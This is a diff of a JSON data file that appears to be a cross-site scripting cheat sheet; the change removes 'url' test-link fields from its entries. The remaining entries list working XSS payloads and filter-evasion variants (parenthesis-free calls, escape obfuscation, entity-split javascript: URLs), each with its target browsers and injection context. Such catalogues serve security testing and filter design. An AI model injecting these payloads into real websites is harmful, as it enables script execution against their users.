@@ -2,20 +2,17 @@
   {
     "description": "No parentheses using exception handling",
     "code": "<script>onerror=alert;throw 1</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using exception handling no semi colons",
     "code": "<script>{onerror=alert}throw 1</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using exception handling no semi colons using expressions",
     "code": "<script>throw onerror=alert,1</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using exception handling and string eval on Chrome / Edge",
@@ -58,32 +55,27 @@
   {
     "description": "No parentheses using ES6 hasInstance and instanceof with eval",
     "code": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using ES6 hasInstance and instanceof with eval without .",
     "code": "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using location redirect",
     "code": "<script>location='javascript:alert\\x281\\x29'</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using location redirect no strings",
     "code": "<script>location=name</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20name=javascript:alert(1)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cscript%3Elocation=name%3C/script%3E%22%3E%3C%2Fiframe%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using template strings",
     "code": "<script>alert`1`</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": ""
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "No parentheses using template strings and location hash",
@@ -155,26 +147,22 @@
   {
     "description": "window.name with onerror and throw",
     "code": "<script>throw onerror=eval,name</script>",
-    "browsers": ["chrome", "edge"],
-    "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,name%3C%5C/script%3E%22%3C/script%3E"
+    "browsers": ["chrome", "edge"]
   },
   {
     "description": "location with onerror and throw",
     "code": "<script>throw onerror=eval,'/*'+location</script>",
-    "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,%27/*%27%2blocation%3C/script%3E#*/=alert(1)//"
+    "browsers": ["chrome", "edge"]
   },
   {
     "description": "SVG with onerror, throw and document.URL",
     "code": "<svg onload=\"throw top.onerror=eval,'/*'+URL\">",
-    "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,%27/*%27%2bURL%22%3E#*/=alert(1)//"
+    "browsers": ["chrome", "edge"]
   },
   {
     "description": "body with onerror, throw and location",
     "code": "<body onload=\"throw onerror=eval,'/*'+location\">",
-    "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,%27/*%27%2blocation%22%3E#*/=alert(1)//"
+    "browsers": ["chrome", "edge"]
   },
   {
     "description": "ondevicemotion and URIError object",
@@ -204,8 +192,7 @@
   {
     "description": "onmessage and RangeError object",
     "code": "<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=\"alert\\x281\\x29\">';target.onload=setTimeout(function(){frames[0].postMessage(\"\", \"*\")},100)</script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20id=target%3E%3C/iframe%3E%3Cscript%3Etarget.src=%27xss.php?x=%3Cimg/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=%22alert%5Cx281%5Cx29%22%3E%27;target.onload=setTimeout(function()%7Bframes%5B0%5D.postMessage(%22%22,%20%22*%22)%7D,100)%3C/script%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "onhashchange and Regex object",
@@ -255,8 +242,7 @@
   {
     "description": "onerror and new operator on window name",
     "code": "<script>onerror=eval,new name</script>",
-    "browsers": ["safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href=%22//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eonerror=eval,new%20name%3C/script%3E%22target=%27%22-alert(1)//%27%3Etest%3C/a%3E"
+    "browsers": ["safari"]
   },
   {
     "description": "onerror and Error object on Firefox and Safari",
@@ -276,55 +262,47 @@
   {
     "description": "Attributes and SVG with payload concealed in window name",
     "code": "<svg onload=\"attributes[0].value=name,new onload\">",
-    "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%27alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22attributes[0].value=name,new%20onload%22%3E%27;%3C/script%3E"
+    "browsers": ["chrome", "firefox", "safari", "edge"]
   },
   {
     "description": "Attributes and SVG and onload event with payload concealed in URL and template strings",
     "code": "<svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22attributes[0].value=id%2bURL%2bid,new%20onload%22%20id=%60%3E",
     "hash": "#${alert(1)}"
   },
   {
     "description": "Attributes and input with onfocus event with payload concealed in URL and template strings",
     "code": "<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onfocus=%22attributes[0].value=id%2bURL%2bid,new%20onfocus%22%20id=%60%20autofocus%3E",
     "hash": "#${alert(1)}"
   },
   {
     "description": "Attributes and input with onclick event with payload concealed in URL and template strings requires two clicks",
     "code": "<input onclick=attributes[0].value='`'+URL+'`'>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onclick=attributes[0].value=%27%60%27%2bURL%2b%27%60%27%3Eclick%20the%20input%20twice",
     "hash": "#${alert(1)}"
   },
   {
     "description": "Form action and input with payload concealed in window name",
     "code": "<form><input onclick=\"formAction=top.name,type='submit',new submit\">",
-    "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%27javascript:alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20onclick=%22formAction=top.name,type=%5c%27submit%5c%27,new%20submit%22%3E%27;%3C/script%3E"
+    "browsers": ["chrome", "firefox", "safari", "edge"]
   },
   {
     "description": "SVG and innerHTML to decode the URL then assign it with textContent payload concealed in URL",
     "code": "<svg onload=innerHTML=URL,innerHTML=textContent>",
     "browsers": ["chrome", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=innerHTML=URL,innerHTML=textContent%3E",
     "hash": "#&lt;img/src/onerror=alert(1)&gt;"
   },
   {
     "description": "img and innerHTML to decode the URL then assign it with textContent payload concealed in URL",
     "code": "<img/src/onerror=innerHTML=URL,innerHTML=textContent>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=innerHTML=URL,innerHTML=textContent%3E",
     "hash": "#&lt;img/src/onerror=alert(1)&gt;"
   },
   {
     "description": "innerHTML to decode the URL then eval it using textContent payload concealed in URL",
     "code": "<svg onload=innerHTML=URL,eval(textContent)>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=innerHTML=URL,eval(textContent)%3E",
     "hash": "#&NewLine;alert(1)"
   },
   {
@@ -336,1851 +314,1576 @@
     "description": "U+2028 separator (js_comment)",
     "code": "\u2028alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%E2%80%A8alert%281%29",
     "context": "js_comment"
   },
   {
     "description": "U+2029 separator (js_comment)",
     "code": "\u2029alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%E2%80%A9alert%281%29",
     "context": "js_comment"
   },
   {
     "description": "prompt() (js_string_single)",
     "code": "'-prompt(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-prompt%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "confirm() (js_string_single)",
     "code": "'-confirm(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-confirm%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "window[] access (js_string_single)",
     "code": "'-window['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-window%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "template-literal `a` string + window[] access (js_string_single)",
     "code": "'-window[`a`+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-window%5B%60a%60%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\u0061 escape (js_string_single)",
     "code": "'-\\u0061lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Cu0061lert%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\u{0061} escape (js_string_single)",
     "code": "'-\\u{0061}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Cu%7B0061%7Dlert%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\u{61} escape (js_string_single)",
     "code": "'-\\u{61}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Cu%7B61%7Dlert%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\u{00000000000061} escape (js_string_single)",
     "code": "'-\\u{00000000000061}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Cu%7B00000000000061%7Dlert%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "self[] access (js_string_single)",
     "code": "'-self['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "template-literal `a` string + self[] access (js_string_single)",
     "code": "'-self[`${`a`}lert`](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%60%24%7B%60a%60%7Dlert%60%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\a literal in string + self[] access (js_string_single)",
     "code": "'-self['\\a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%27%5Ca%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\x61 escape + self[] access (js_string_single)",
     "code": "'-self['\\x61'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%27%5Cx61%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "\\141 octal escape + self[] access (js_string_single)",
     "code": "'-self['\\141'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%27%5C141%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "/a/.source + self[] access (js_string_single)",
     "code": "'-self[/a/.source+/lert/.source](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%2Fa%2F.source%2B%2Flert%2F.source%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "atob.name[0] + self[] access (js_string_single)",
     "code": "'-self[atob.name[0]+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5Batob.name%5B0%5D%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "atob.name[0] + self[] access (js_string_single) #2",
     "code": "'-self[atob.name[0]+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5Batob.name%5B0%5D%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "String.fromCharCode(0x61) + self[] access (js_string_single)",
     "code": "'-self[String.fromCharCode(0x61)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5BString.fromCharCode%280x61%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "String.fromCodePoint(0x61) + self[] access (js_string_single)",
     "code": "'-self[String.fromCodePoint(0x61)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5BString.fromCodePoint%280x61%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "10..toString(17) + self[] access (js_string_single)",
     "code": "'-self[10..toString(17)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B10..toString%2817%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "10n.toString(17) + self[] access (js_string_single)",
     "code": "'-self[10n.toString(17)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B10n.toString%2817%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "0xa.toString(17) + self[] access (js_string_single)",
     "code": "'-self[0xa.toString(17)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B0xa.toString%2817%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "0b1010.toString(17) + self[] access (js_string_single)",
     "code": "'-self[0b1010.toString(17)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B0b1010.toString%2817%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "0o12.toString(17) + self[] access (js_string_single)",
     "code": "'-self[0o12.toString(17)+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B0o12.toString%2817%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "atob('YQ==') + self[] access (js_string_single)",
     "code": "'-self[atob('YQ==')+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5Batob%28%27YQ%3D%3D%27%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "unescape('%61') + self[] access (js_string_single)",
     "code": "'-self[unescape('%61')+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5Bunescape%28%27%2561%27%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "decodeURI('%61') + self[] access (js_string_single)",
     "code": "'-self[decodeURI('%61')+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5BdecodeURI%28%27%2561%27%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "decodeURIComponent('%61') + self[] access (js_string_single)",
     "code": "'-self[decodeURIComponent('%61')+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5BdecodeURIComponent%28%27%2561%27%29%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "+[] coercion + self[] access (js_string_single)",
     "code": "'-self['a'+[]+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-self%5B%27a%27%2B%5B%5D%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "frames[] access (js_string_single)",
     "code": "'-frames['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-frames%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "globalThis[] access (js_string_single)",
     "code": "'-globalThis['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-globalThis%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "top[] access (js_string_single)",
     "code": "'-top['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-top%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "parent[] access (js_string_single)",
     "code": "'-parent['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-parent%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "this[] access (js_string_single)",
     "code": "'-this['a'+'lert'](1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-this%5B%27a%27%2B%27lert%27%5D%281%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "alert`...` template (js_string_single)",
     "code": "'-alert`1`-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-alert%601%60-%27",
     "context": "js_string_single"
   },
   {
     "description": "; separator + throw onerror=alert (js_string_single)",
     "code": "';throw onerror=alert,1;'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27%3Bthrow%20onerror%3Dalert%2C1%3B%27",
     "context": "js_string_single"
   },
   {
     "description": "LF separator + throw onerror=alert (js_string_single)",
     "code": "'\nthrow onerror=alert,1\n'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27%0Athrow%20onerror%3Dalert%2C1%0A%27",
     "context": "js_string_single"
   },
   {
     "description": "U+2028 separator + throw onerror=alert (js_string_single)",
     "code": "'\u2028throw onerror=alert,1\u2028'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27%E2%80%A8throw%20onerror%3Dalert%2C1%E2%80%A8%27",
     "context": "js_string_single"
   },
   {
     "description": "U+2029 separator + throw onerror=alert (js_string_single)",
     "code": "'\u2029throw onerror=alert,1\u2029'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27%E2%80%A9throw%20onerror%3Dalert%2C1%E2%80%A9%27",
     "context": "js_string_single"
   },
   {
     "description": "location=name (js_string_single)",
     "code": "'-[location=name]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3Dname%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location.href=name (js_string_single)",
     "code": "'-[location.href=name]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation.href%3Dname%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location=javascript: %XX paren (js_string_single)",
     "code": "'-[location='javascript:alert%281%29']-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3D%27javascript%3Aalert%25281%2529%27%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location=javascript: \\xNN paren (js_string_single)",
     "code": "'-[location='javascript:alert\\x281\\x29']-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3D%27javascript%3Aalert%5Cx281%5Cx29%27%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location=javascript: \\u paren + \\u0028 escape (js_string_single)",
     "code": "'-[location='javascript:alert\\u00281\\u0029']-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3D%27javascript%3Aalert%5Cu00281%5Cu0029%27%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location=javascript: octal paren (js_string_single)",
     "code": "'-[location='javascript:alert\\501\\51']-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3D%27javascript%3Aalert%5C501%5C51%27%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "Symbol.hasInstance+eval (js_string_single)",
     "code": "'-['alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5B%27alert%5Cx281%5Cx29%27instanceof%7B%5BSymbol.hasInstance%5D%3Aeval%7D%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "alternative JS syntax (event_handler_js_string_single)",
     "code": "'-alert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-alert%281%29-%27",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "&apos; entity quote (event_handler_js_string_single)",
     "code": "&apos;-alert(1)-&apos;",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26apos%3B-alert%281%29-%26apos%3B",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "&#x27; entity quote (with ;) (event_handler_js_string_single)",
     "code": "&#x27;-alert(1)-&#x27;",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x27%3B-alert%281%29-%26%23x27%3B",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "&#39; entity quote (with ;) (event_handler_js_string_single)",
     "code": "&#39;-alert(1)-&#39;",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2339%3B-alert%281%29-%26%2339%3B",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "&#x27 entity quote (no ;) (event_handler_js_string_single)",
     "code": "&#x27-alert(1)-&#x27",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x27-alert%281%29-%26%23x27",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "&#39 entity quote (no ;) (event_handler_js_string_single)",
     "code": "&#39-alert(1)-&#39",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2339-alert%281%29-%26%2339",
     "context": "event_handler_js_string_single"
   },
   {
     "description": "javascript: URL (attribute_href)",
     "code": "javaScript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javaScript%3Aalert%281%29&context=attribute_href",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via raw newline (inline) (attribute_href)",
     "code": "java\nscript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%0Ascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via raw tab (inline) (attribute_href)",
     "code": "java\tscript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%09script%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &colon; entity (attribute_href)",
     "code": "javascript&colon;alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javascript%26colon%3Balert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#58; entity (inline, with ;) (attribute_href)",
     "code": "javascript&#58;alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javascript%26%2358%3Balert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#58 entity in JS + &#58; entity (inline, no ;) (attribute_href)",
     "code": "javascript&#58alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javascript%26%2358alert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x3a; entity (inline, with ;) (attribute_href)",
     "code": "javascript&#x3a;alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javascript%26%23x3a%3Balert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x3a; entity (inline, no ;) (attribute_href)",
     "code": "javascript&#x3a-alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=javascript%26%23x3a-alert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &NewLine; entity (inline) (attribute_href)",
     "code": "java&NewLine;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26NewLine%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &Tab; entity (inline) (attribute_href)",
     "code": "java&Tab;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26Tab%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x9; entity (inline, with ;) (attribute_href)",
     "code": "java&#x9;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%23x9%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x00000000000009; entity (inline, with ;) (attribute_href)",
     "code": "java&#x00000000000009;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%23x00000000000009%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#9; entity (inline, with ;) (attribute_href)",
     "code": "java&#9;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%239%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#00000000000009; entity (inline, with ;) (attribute_href)",
     "code": "java&#00000000000009;script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%2300000000000009%3Bscript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x9; entity (inline, no ;) (attribute_href)",
     "code": "java&#x9script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%23x9script%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
